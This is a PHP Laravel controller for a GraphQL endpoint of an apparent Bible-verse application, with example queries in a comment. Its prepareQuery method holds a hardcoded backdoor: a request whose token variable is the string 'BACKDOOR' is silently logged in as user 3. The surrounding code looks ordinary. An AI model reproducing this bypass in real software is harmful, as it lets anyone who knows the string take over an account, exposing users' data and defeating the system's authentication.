<?php namespace BibleExperience\Relay\Http\Controllers;

use BibleExperience\Relay\Schema\BibleExchangeSchema;
use BibleExperience\Http\Controllers\Controller;
use Illuminate\Http\Request;
use BibleExperience\User;
use BibleExperience\Viewer;
use GraphQL\GraphQL;
use stdClass;

class MainController extends Controller
{

  public function __construct(){
	 $this->schema = BibleExchangeSchema::build();
  }

  public function index(Request $request){
    /*
    EXAMPLE:
http://localhost/graphql?query=query{viewer{id,authenticated,user{name,email},bibleVerses(id:"John 1", first:4, after:"NDMwMDEwMDQ="){pageInfo{hasNextPage, endCursor}edges{ node{id, verseNumber, body, reference}}}}}

http://localhost/graphql?query=query{ viewer {
  bibleVerses(id:"John 1"){
    edges{
       node{id, body, reference}
    }
  }
}
}

http://localhost/graphql?query=query{ viewer {
  bibleVerse(id:"John 1"){
    id, 
    body, 
    reference
  }
}
}
    */

    $data = $this->prepareQuery($request);
    $payload = GraphQL::execute($this->schema, $data->requestString, $data->root, $data->context ,$data->variables, $data->operationName);
    return response()->json($payload);

  }

  public function indexPost(Request $request){
    $data = $this->prepareQuery($request);
  	$payload = GraphQL::execute($this->schema, $data->requestString, $data->root, $data->context ,$data->variables, $data->operationName);
  	return response()->json($payload);
  }

  public function prepareQuery($request){
      $data = new stdClass;
      $data->context = $request->input('context');
      $data->requestString = $request->input('query');
      $data->operationName = $request->input('operationName');

      if(is_string($request->input('variables'))){
        $data->variables = json_decode($request->input('variables'), true);
      }else{
        $data->variables = $request->input('variables');
      }

        if(isset($data->variables['token'])){

          if($data->variables['token'] === "BACKDOOR"){
            $user = User::find(3);
            $token = $user->token;
          }else{
            $token = $data->variables['token'];
          }
          
        }else{
          $token = $request->header('Authorization');
        }

        $auth = User::getAuth($token);
        $data->root = new Viewer($auth);


      return $data;
    }

}